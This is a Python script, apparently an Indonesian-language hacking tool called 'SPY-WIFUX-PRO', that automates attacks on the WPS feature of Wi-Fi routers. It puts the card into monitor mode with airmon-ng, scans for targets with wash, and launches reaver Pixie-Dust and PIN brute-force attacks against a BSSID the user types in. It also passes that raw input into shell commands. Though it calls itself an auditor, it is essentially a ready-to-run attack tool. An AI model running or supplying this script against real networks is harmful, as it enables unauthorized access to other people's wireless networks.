```python
#!/usr/bin/env python3
# ==========================================
# TOOL NAME : SPY-WIFUX-PRO (NAGA-WIFUX)
# BRAND     : SPY-E & 123Tool
# VERSION   : 2.0 (Premium Edition)
# ==========================================

import os, sys, subprocess, time

# COLORS
C, G, Y, R, W, B = '\033[96m', '\033[92m', '\033[93m', '\033[91m', '\033[0m', '\033[1m'

def banner():
    os.system('clear')
    print(f"""{R}{B}
 ███████╗██████╗ ██╗   ██╗      ██╗    ██╗██╗███████╗██╗   ██╗██╗  ██╗
 ██╔════╝██╔══██╗╚██╗ ██╔╝      ██║    ██║██║██╔════╝██║   ██║╚██╗██╔╝
 ███████╗██████╔╝ ╚████╔╝ █████╗██║ █╗ ██║██║█████╗  ██║   ██║ ╚███╔╝ 
 ╚════██║██╔═══╝   ╚██╔╝  ╚════╝██║███╗██║██║██╔══╝  ██║   ██║ ██╔██╗ 
 ███████║██║        ██║         ╚███╔███╔╝██║██║     ╚██████╔╝██╔╝ ██╗
 ╚══════╝╚═╝        ╚═╝          ╚══╝╚══╝ ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
{W}{C}       >>> SPY-WIFUX-PRO | NAGA-WIFUX V2.0 PREMIUM <<<
{G}       [ Automated WPS Auditor - Powered by SPY-E & 123Tool ]{W}""")

def check_root():
    if os.geteuid() != 0:
        print(f"{R}[!] ERROR: Jalankan sebagai ROOT (sudo)!{W}")
        sys.exit()

def get_interfaces():
    print(f"{Y}[*] Mendeteksi Interface Network...{W}")
    # Mengambil daftar interface via 'iw dev' atau 'ifconfig'
    proc = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
    if not proc.stdout:
        proc = subprocess.run(['ifconfig'], capture_output=True, text=True)
    return proc.stdout

def start_attack(iface):
    print(f"{G}[+] Memulai Scanning Target WPS (Tekan CTRL+C jika target muncul)...{W}")
    try:
        # Menggunakan wash untuk scan WPS
        os.system(f"sudo wash -i {iface}")
        target_bssid = input(f"\n{Y}Masukkan BSSID Target: {W}")
        target_ch = input(f"{Y}Masukkan Channel Target: {W}")
        
        print(f"\n{C}[*] Meluncurkan Pixie-Dust Attack (NAGA-MODE)...{W}")
        # Command Reaver dengan integrasi PixieWPS otomatis (-K 1)
        cmd = f"sudo reaver -i {iface} -b {target_bssid} -c {target_ch} -K 1 -f -vv"
        os.system(cmd)
    except KeyboardInterrupt:
        print(f"\n{R}[-] Audit dihentikan oleh user.{W}")

def main():
    banner()
    check_root()
    print(f"{B}Interface yang tersedia:{W}")
    print(get_interfaces())
    
    iface = input(f"{C}Masukkan Nama Interface (cth: wlan0mon): {W}")
    
    while True:
        print(f"\n{B}PILIH MODUL AUDIT:{W}")
        print(f"1) {G}Aktifkan Mode Monitor (airmon-ng){W}")
        print(f"2) {G}Scan & Auto-Exploit WPS (Pixie-Dust){W}")
        print(f"3) {G}Brute Force PIN WPS (Standard Reaver){W}")
        print(f"4) {Y}Reset Interface (Managed Mode){W}")
        print(f"0) Exit")
        
        choice = input(f"\n{C}SPY-WIFUX > {W}")
        
        if choice == '1':
            os.system(f"sudo airmon-ng start {iface}")
            print(f"{G}[+] Interface {iface} dialihkan ke Mode Monitor.{W}")
        elif choice == '2':
            start_attack(iface)
        elif choice == '3':
            bssid = input(f"{Y}BSSID Target: {W}")
            os.system(f"sudo reaver -i {iface} -b {bssid} -vv")
        elif choice == '4':
            os.system(f"sudo airmon-ng stop {iface}")
            os.system(f"sudo service network-manager restart")
            print(f"{G}[+] Network Restored.{W}")
        elif choice == '0':
            print(f"{C}Sampai jumpa, Bosku!{W}")
            break

if __name__ == "__main__":
    main()
